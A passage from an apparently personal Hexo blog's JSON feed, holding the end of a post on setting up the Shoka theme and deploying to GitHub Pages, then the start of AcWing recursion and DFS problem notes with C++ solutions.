punctuation\">:</span> <span class=\"token string\">\"^3.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-renderer-ejs\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-renderer-multi-markdown-it\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^0.1.5\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-renderer-stylus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-server\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-symbols-count-time\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^0.7.1\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-util\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.4.0\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"_configshokayml\"><a class=\"anchor\" href=\"#_configshokayml\">#</a> _config.shoka.yml</h2>\n<p>&lt;root&gt;/_config.shoka.yml 路径下</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">alternate</span><span class=\"token punctuation\">:</span> Yume Shoka</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Assets</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token key atrule\">statics</span><span class=\"token punctuation\">:</span> / <span class=\"token comment\">#//cdn.jsdelivr.net/gh/amehime/shoka@latest/</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token key atrule\">open_graph</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">#twitter_id:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">#google_plus:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">#fb_admins:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">#fb_app_id:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token key atrule\">menu</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token key atrule\">home</span><span class=\"token punctuation\">:</span> / <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> home</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">posts</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token key atrule\">default</span><span class=\"token punctuation\">:</span> / <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> feather</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token key atrule\">archives</span><span class=\"token punctuation\">:</span> /archives/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> list<span class=\"token punctuation\">-</span>alt</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token key atrule\">categories</span><span class=\"token punctuation\">:</span> /categories/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> th</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token key atrule\">tags</span><span class=\"token punctuation\">:</span> /tags/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> tags</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token key atrule\">friends</span><span class=\"token punctuation\">:</span> /friends/ <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> heart</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># Social Links</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># Usage: `Key: permalink || icon || color`</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># Key is the link label showing to end users.</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># Value before `||` delimiter is the target permalink,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># secend value is the name of Font icon.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token key atrule\">social</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token key atrule\">github</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//github.com/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> github <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#191717\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token comment\">#google: https://plus.google.com/yourname || google</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token key atrule\">twitter</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//twitter.com/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> twitter <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#00aff0\"</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token key atrule\">zhihu</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//www.zhihu.com/people/rurismzk <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> zhihu <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#1e88e5\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token key atrule\">music</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//music.163.com/<span class=\"token comment\">#/user/home?id=12886823 || cloud-music || \"#e60026\"</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token key atrule\">weibo</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//weibo.com/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> weibo <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#ea716e\"</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token key atrule\">about</span><span class=\"token punctuation\">:</span> https<span class=\"token punctuation\">:</span>//about.me/amehime <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> address<span class=\"token punctuation\">-</span>card <span class=\"token punctuation\">|</span><span class=\"token punctuation\">|</span> \"<span class=\"token comment\">#3b5998\"</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token comment\">#email: mailto:yourname@mail.com || envelope || \"#55acd5\"</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token comment\">#facebook: https://www.facebook.com/yourname || facebook</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">#stackoverflow: https://stackoverflow.com/yourname || stack-overflow</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">#youtube: https://youtube.com/yourname || youtube</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">#instagram: https://instagram.com/yourname || instagram</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">#skype: skype:yourname?call|chat || skype</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">#douban: https://www.douban.com/people/yourname/ || douban</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token key atrule\">footer</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token comment\"># Specify the date when the site was setup. If not defined, current year will be used.</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token key atrule\">since</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2010</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token key atrule\">count</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token key atrule\">post</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token key atrule\">count</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># Third Party Plugins &amp; Services Settings</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\"># Comments</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\"># Valine</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># For more information: https://valine.js.org, https://github.com/xCss/Valine</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token key atrule\">valine</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token key atrule\">appId</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#这里不要忘了改</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token key atrule\">appKey</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#这里不要忘了改</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token key atrule\">placeholder</span><span class=\"token punctuation\">:</span> ヽ(○´∀`)ﾉ♪ <span class=\"token comment\"># Comment box placeholder</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token key atrule\">pageSize</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> <span class=\"token comment\"># Pagination size</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  <span class=\"token key atrule\">lang</span><span class=\"token punctuation\">:</span> zh<span class=\"token punctuation\">-</span>CN</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  <span class=\"token key atrule\">tagMember</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token key atrule\">master</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>      <span class=\"token comment\"># - deea5a8d259d17182a53be1772e4c182</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token key atrule\">friend</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token punctuation\">-</span> deea5a8d259d17182a53be1772e4c182</pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\"># bgm</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token comment\"># audio:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\"># Dependencies: https://github.com/amehime/hexo-renderer-multi-markdown-it</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token key atrule\">pangu</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token comment\"># analytics &amp; SEO Settings</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token comment\"># ---------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># Disable Baidu transformation on mobile devices.</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token key atrule\">disable_baidu_transformation</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token comment\"># Automatically add external URL with Base64 encrypt &amp; decrypt.</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token key atrule\">exturl</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token comment\"># 自动滚动上次浏览的位置</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token key atrule\">auto_scroll</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token comment\"># 夜间模式</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token key atrule\">darkmode</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre><span class=\"token comment\"># 是否显示页面加载动画 loading-cat</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token key atrule\">loader</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token key atrule\">start</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 当初次打开页面时，显示加载动画</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>  <span class=\"token key atrule\">switch</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># tab 切换到其他页面时，显示加载动画</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token comment\"># 单机页面特效</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token key atrule\">fireworks</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 是否启用</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token key atrule\">color</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 烟花颜色</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(255,182,185,.9)\"</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(250,227,217,.9)\"</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(187,222,214,.9)\"</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">\"rgba(138,198,209,.9)\"</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># 加载谷歌字体</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token key atrule\">font</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token comment\"># Font options:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token comment\"># `external: true` will load this font family from `host` above.</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  <span class=\"token comment\"># `family: Times New Roman`. Without any quotes.</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\"># `size: x.x`. Use `em` as unit. Default: 1 (16px)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>  <span class=\"token comment\"># Global font settings used for all elements inside &lt;body>.</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>  <span class=\"token key atrule\">global</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Mulish</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>  <span class=\"token comment\"># Font settings for alternate title.</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>  <span class=\"token key atrule\">logo</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Fredericka the Great</pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3.5</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>  <span class=\"token comment\"># Font settings for site title.</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  <span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Noto Serif JP</pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2.5</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>  <span class=\"token comment\"># Font settings for headlines (&lt;h1> to &lt;h6>).</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>  <span class=\"token key atrule\">headings</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Noto Serif SC</pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>  <span class=\"token comment\"># Font settings for posts.</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>  <span class=\"token key atrule\">posts</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>  <span class=\"token comment\"># Font settings for &lt;code> and code blocks.</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>  <span class=\"token key atrule\">codes</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Inconsolata</pre></td></tr></table></figure><h1 id=\"发布到github-pages\"><a class=\"anchor\" href=\"#发布到github-pages\">#</a> 发布到 Github Pages</h1>\n<p><code>npm install hexo-deployer-git --save</code></p>\n<p>修改根目录下的  <code>_config.yml</code> ，配置  <code>GitHub</code>  相关信息</p>\n<pre><code>deploy:\n  type: git\n  repo: https://github.com/Xh1Xxhg/Xh1Xxhg.github.io.git\n  branch: main\n  token: ghp_xxxxxxxxxxxxxxxxxxx(自己生成)\n</code></pre>\n<p>token 生成</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240229150023484.png\" alt=\"image-20240229150023484\" /></p>\n<p><code>hexo g -d</code>  部署</p>\n<p>直接访问即可</p>\n<p>https://&lt;yourname&gt;.github.io/</p>\n<h1 id=\"发布文章\"><a class=\"anchor\" href=\"#发布文章\">#</a> 发布文章</h1>\n<p>清空根目录 /public 目录所有文件，重新</p>\n<p><code>hexo g</code></p>\n<p><code>hexo server</code></p>\n<p><code>hexo g -d</code></p>\n",
            "tags": [
                "开发",
                "As Developers"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95_acwing/",
            "url": "http://yoursite.com/Algorithm/%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95_acwing/",
            "title": "题解记录_acwing",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"92递归实现指数型枚举\"><a class=\"anchor\" href=\"#92递归实现指数型枚举\">#</a> 92. 递归实现指数型枚举</h1>\n<p>从 1∼n 这 n 个整数中随机选取任意多个，输出所有可能的选择方案。</p>\n<p><strong>输入格式</strong></p>\n<p>输入一个整数 n。</p>\n<p><strong>输出格式</strong></p>\n<p>每行输出一种方案。</p>\n<p>同一行内的数必须升序排列，相邻两个数用恰好 11 个空格隔开。</p>\n<p>对于没有选任何数的方案，输出空行。</p>\n<p>本题有自定义校验器（SPJ），各行（不同方案）之间的顺序任意。</p>\n<p><strong>数据范围</strong></p>\n<p>1≤n≤15</p>\n<p><strong>输入样例：</strong></p>\n<pre><code>3\n</code></pre>\n<p><strong>输出样例：</strong></p>\n<pre><code>3\n2\n2 3\n1\n1 3\n1 2\n1 2 3\n</code></pre>\n<p>1-n 考虑每个数选或不选</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240114201307669.png\" alt=\"image-20240114201307669\" /></p>\n<p><strong>不记录状态 Code</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;cstdio&gt;\n#include&lt;cstring&gt;\n#include&lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 15;\nint pos;\nint status[N]; //0未考虑，1选，2不选\n\nvoid dfs(int p) &#123;\n    //递归到边界值\n    if(p&gt;pos) &#123;\n        for (int i = 1; i &lt;= pos; i++) &#123;\n            if (status[i]==1)\n                printf(&quot;%d&quot;,i);\n        &#125;\n        printf(&quot;\\n&quot;);\n        return;\n    &#125;\n    //不选\n    status[p] = 2;\n    dfs(p+1);//第一个分支\n    //回溯时恢复现场\n    status[p] = 0;\n\n    //选\n    status[p] = 1;\n    dfs(p+1);\n    status[p] = 0;\n&#125;\n\nint main() &#123;\n    cin &gt;&gt; pos;\n\n    dfs(1);\n\n    return 0;\n&#125;\n</code></pre>\n<p><strong>记录状态 Code</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;cstdio&gt;\n#include&lt;cstring&gt;\n#include&lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 15;\nint pos;//位数\nint status[N]; //0未考虑，1选，2不选\n\nint ways[1&lt;&lt;N][N+1], cnt;//二维数组记录状态，cnt当前方案数量\n\nvoid dfs(int p) &#123;\n    //递归到边界值\n    if(p&gt;pos) &#123;\n        for (int i = 1; i &lt;= pos; i++)\n        &#123;\n            if (status[i]==1)\n            &#123;\n                ways[cnt][i] = i;\n            &#125;\n        &#125;\n        cnt++;\n        return;\n    &#125;\n\n    //不选\n    status[p] = 2;\n    dfs(p+1);//第一个分支\n    //回溯时恢复现场\n    status[p] = 0;\n\n    //选\n    status[p] = 1;\n    dfs(p+1);\n    status[p] = 0;\n&#125;\n\nint main() &#123;\n    cin &gt;&gt; pos;\n\n    dfs(1);\n\n    for (int i = 0; i &lt; cnt; i++)\n    &#123;\n        for (int j = 1; j &lt; pos; j++)\n        &#123;\n            printf(&quot;%d&quot;,ways[i][j]);\n        &#125;\n        puts(&quot;&quot;);\n    &#125;\n    \n    return 0;\n&#125;\n</code></pre>\n<p>&lt;u&gt;puts 输出一个字符串 + 一个回车 &lt;/u&gt;</p>\n<h1 id=\"94递归实现排列型枚举\"><a class=\"anchor\" href=\"#94递归实现排列型枚举\">#</a> 94. 递归实现排列型枚举</h1>\n<p>把 1∼n 这 n 个整数排成一行后随机打乱顺序，输出所有可能的次序。</p>\n<p><strong>输入格式</strong></p>\n<p>一个整数 n。</p>\n<p><strong>输出格式</strong></p>\n<p>按照从小到大的顺序输出所有方案，每行 11 个。</p>\n<p>首先，同一行相邻两个数用一个空格隔开。</p>\n<p>其次，对于两个不同的行，对应下标的数一一比较，字典序较小的排在前面。</p>\n<p><strong>数据范围</strong></p>\n<p>1≤n≤9</p>\n<p><strong>输入样例：</strong></p>\n<pre><code>3\n</code></pre>\n<p><strong>输出样例：</strong></p>\n<pre><code>1 2 3\n1 3 2\n2 1 3\n2 3 1\n3 1 2\n3 2 1\n</code></pre>\n<p><strong>深度优先搜索 DFS</strong></p>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n#include&lt;cstring&gt;\n#include&lt;algorithm&gt;\n#include&lt;cstdio&gt;\n\nusing namespace std;\n\nconst int N = 10;\n\nint n;\nint state[N]; // 0还没放，1~n放了哪个数\nbool used[N]; // true用过，false未用过\n\nvoid dfs(int u) &#123;\n    // 边界\n    if(u&gt;n) &#123;\n        for (int i = 1; i &lt;= n; i++)\n            printf(&quot;%d&quot;,state[i]);\n        puts(&quot;&quot;);\n        return;\n    &#125;\n    // 依次枚举分支，保存状态序列\n    for (int i = 1; i &lt;= n; i++)\n    &#123;\n        if (!used[i])\n        &#123;\n            state[u] = i; // 位置的状态更新\n            used[i] = 1; // n中的数i是否被使用\n            dfs(u+1); //搜索下一个位置状态\n\n            //恢复现场\n            state[u] = 0;\n            used[i] = 0;\n        &#125;\n    &#125;\n    \n&#125;\n\nint main() &#123;\n    scanf(&quot;%d&quot;,&amp;n);\n    dfs(1);\n\n    return 0;\n&#125;\n</code></pre>\n<p>时间复杂度 <code>n+n^2+n(n-1)n+...+n!*n</code></p>\n<p>范围 <code>n*2n! &lt; n(1+n+n(n-1)+...+n!) &lt; n*3n!</code></p>\n<h1 id=\"93递归实现组合型枚举\"><a class=\"anchor\" href=\"#93递归实现组合型枚举\">#</a> 93. 递归实现组合型枚举</h1>\n<p>从 1∼n1 这 n 个整数中随机选出 m 个，输出所有可能的选择方案。</p>\n<p><strong>输入格式</strong></p>\n<p>两个整数 n,m , 在同一行用空格隔开。</p>\n<p><strong>输出格式</strong></p>\n<p>按照从小到大的顺序输出所有方案，每行 11 个。</p>\n<p>首先，同一行内的数升序排列，相邻两个数用一个空格隔开。</p>\n<p>其次，对于两个不同的行，对应下标的数一一比较，字典序较小的排在前面（例如  <code>1 3 5 7</code>  排在  <code>1 3 6 8</code>  前面）。</p>\n<p><strong>数据范围</strong></p>\n<p>n&gt;0 ,<br />\n0≤m≤n ,<br />\nn+(n−m)≤25</p>\n<p><strong>输入样例：</strong></p>\n<pre><code>5 3\n</code></pre>\n<p><strong>输出样例：</strong></p>\n<pre><code>1 2 3 \n1 2 4 \n1 2 5 \n1 3 4 \n1 3 5 \n1 4 5 \n2 3 4 \n2 3 5 \n2 4 5 \n3 4 5 \n</code></pre>\n<p><strong>思考题</strong>：如果要求使用非递归方法，该怎么做呢？</p>\n<p><strong>递归法</strong></p>\n<pre><code class=\"language-c++\">#include&lt;cstdio&gt;\n#include&lt;algorithm&gt;\n#include&lt;cstring&gt;\n#include&lt;iostream&gt;\n\nusing namespace std;\n\nconst int N = 